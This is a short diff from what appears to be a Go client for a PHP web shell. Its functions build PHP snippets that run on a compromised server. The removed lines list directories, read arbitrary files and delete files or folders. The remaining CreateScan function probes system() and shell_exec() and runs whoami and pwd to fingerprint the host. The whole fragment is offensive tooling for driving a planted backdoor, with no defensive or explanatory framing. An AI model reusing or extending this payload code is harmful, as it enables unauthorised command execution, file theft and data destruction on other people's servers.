@@ -79,18 +79,6 @@ func CreateUpload(dir string) string {
 		"if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
 }
 
-func CreateListFile(scope string) string {
-	return "$r=implode('\n', scandir(" + scope + "));"
-}
-
-func CreateReadFile(file string) string {
-	return "$r=file_get_contents('" + file + "');"
-}
-
-func CreateDelete(scope string) string {
-	return "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}"
-}
-
 func CreateScan() string {
 	return `ob_start();system("echo 1;");$r["S"]["sy"]=trim(ob_get_contents());ob_end_clean();
 $r["S"]["sh"]=trim(shell_exec("echo 1;"));$r["I"]["w"]=trim(shell_exec("whoami;"));$r["I"]["p"]=trim(shell_exec("pwd;"));
